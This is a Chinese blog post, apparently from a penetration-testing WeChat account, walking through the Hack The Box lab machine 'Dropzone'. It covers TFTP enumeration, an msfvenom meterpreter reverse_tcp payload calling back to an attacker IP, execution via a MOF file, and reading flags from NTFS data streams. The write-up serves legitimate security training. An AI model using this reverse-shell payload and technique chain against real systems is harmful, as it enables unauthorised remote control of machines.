> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qEsAoWmGBrJxtbO9Vcg9xw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **75** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

靶机地址：https://www.hackthebox.eu/home/machines/profile/139

靶机难度：中级（5.0/10）

靶机发布日期：2018 年 11 月 4 日

靶机描述：

Dropzone is an interesting machine that highlights a technique used by the Stuxnet worm. The discovery of NTFS data streams provides an additional challenge.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/wucQH64lHvpOxUzKZzgrk8rOIbSiaoFokwT3HYichsCpM6ibw80Jw5WmZL4vQs947UAIP2l7bicjV6MJECFp51G6sQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxCDqdsr7rRr9orVknssX1aOXVpqIjGyPSuTnk39EIV1bWj7LoSQ5m3A/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.90....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3Czicxdchm8Mnp6DNra92dKrlAplzQgw8OQFUf59xicOP8hqNxzoCaEonpEhQ/640?wx_fmt=png)

可以看到，不存在 TCP 服务... 看看 UDP

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3Czicxia4EKd0pXU1DOMgKIFRGZcwzTF1DKmxvSuQ7jVxicdFNpz8PEWnv28Tw/640?wx_fmt=png)

nmap 发现了 69 的 tftp 服务开放着...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxJnUaczuLRl2fS5aK5ricZnfQSrSKmvibkEMrEcTEA9wHeC1LG5XAIFng/640?wx_fmt=png)

竟然只开放了 tftp 服务，这里可以进行查询命令帮助... 开始找问题收集信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxboP6ePMXdcibwRrwKZVTxZniaibEHgvwKkdxs2UiafROiadldicic3GeB1ibKg/640?wx_fmt=png)

这里尝试下载，发现权限是开放着，是名称打错的原因？试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxD4Q2FmiaNNwwss1eW5ibzIDoyhe5B07HFmesicXOt01maa3vds05Wd40Q/640?wx_fmt=png)

直接尝试下载 boot.ini 这是 windows 系统运行参数的文件... 可以看到这是 windows xp 系统...

XP 系统，这里可以开始提权了...GO

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

二、提权

  

![](https://mmbiz.qpic.cn/mmbiz_png/XxrR38Omj5OU35wZiblPezbUu0aFe8g7adFDiar2por60icw9uh1XSFlykibc3jzCByDbG1hhhxNEk13P15Ofiam6Mg/640?wx_fmt=png)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_gif/z0LeJkZyUa7niaILpQLyj2SXVMFWPGRlKJVgNJ6OUubgicSlhy5yoOrKmqJ2dcAicOTFYG7FUAxFCCbYwz70WcaoQ/640?wx_fmt=gif)

这里利用 MSF 进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxvekrtDrrSTyE4ic1KURxAIppAcjZDWKW2mI42DyRE6UjLxBp6yRL6jw/640?wx_fmt=png)

```
git clone https://github.com/Sayantan5/Dropzone
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.11 lport=443 -f exe > dayu.exe
```

这里利用 msfvenom 生成. exe 的 shellcode... 然后利用 hack.mof 触发 shellcode... 这里. mof 是某位大神利用 wbemexec.rb 编码写的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxTd6Y17RTXicCYL8HSWIscDhbxwyTY2ibfx9GgQY6CKgxHiclyObJaGgkg/640?wx_fmt=png)

前提要将 Mode 模式转换成 octet...

然后上传 dayu.exe，成功上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxARB7j3Sblb0NEAO2Lgr7rshkFQiadb2aP7iaM8HTIoKnHoxxfttJg4Lg/640?wx_fmt=png)

可以看到直接提权成功... 这是 5.0 的分值的靶机... 这么容易？？？？？

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3Czicx9vGkqMoVxsXS9icFZxvGRp5qZ35WLm5qjluVD8LYCumsQPJzpNEtErg/640?wx_fmt=png)

我觉得没这么容易，不给下载... 进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxVKeaxaGq9yQ2vn4VmwRgBDFiaCI3SiaLPx7fwQn3d5MSJm9RDcgdjEog/640?wx_fmt=png)

果然...It's easy, but not THAT easy...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxcIpWqic8031sD5kGLp306oNtNXIiaA0woMa8rjnYsYsdCEQjdic3FEMzw/640?wx_fmt=png)

这里真的恶心...10~1 分钟不等之间会自动退出 shell... 不稳定...

还好我用了 MSF 进行监听...

这里可以发现一个 flags 下的. txt 文本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3CzicxxceCXiamWfGY91jTiciaKhJHZuUC6IYoGQRJBwQIRzkZ78FTDntAx4icnA/640?wx_fmt=png)

再次尝试查看，制动关闭的 shellcode....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3Czicxu03R6rK7icOoPTAFkicFCqibCiczibBcsazBtgic8zMib4pP6kjic6Dgo708cw/640?wx_fmt=png)

这里需要利用 Streams 查看数据信息流...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNr2p7Exfvkm1NqZyic3Czicx4xk1nSiarkNgXePd7sNhEnx8bkfGARUHgiaA0IYo9VE8JDmLiadm2AVpg/640?wx_fmt=png)

利用 tftp 上传... 我快吐了...HTBwindows 服务器最近很卡很卡... 可以看到我上传了 527 秒...

  

等了这么久我竟然没想到利用 smbserver 开启 smb 共享，然后在靶机里 \\10.10.14.11\... 下载 streams.exe... 可能太累了...

成功读取数据流获得了 root/user 信息...

太卡了，可能是 HTB 的 windows 服务器问题，也有人反馈了说很卡...

还有就是只开放一个端口，有时候会有别的玩家进来和我在同一个屋檐下... 不冲突都难...

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/wucQH64lHvpOxUzKZzgrk8rOIbSiaoFokwT3HYichsCpM6ibw80Jw5WmZL4vQs947UAIP2l7bicjV6MJECFp51G6sQ/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)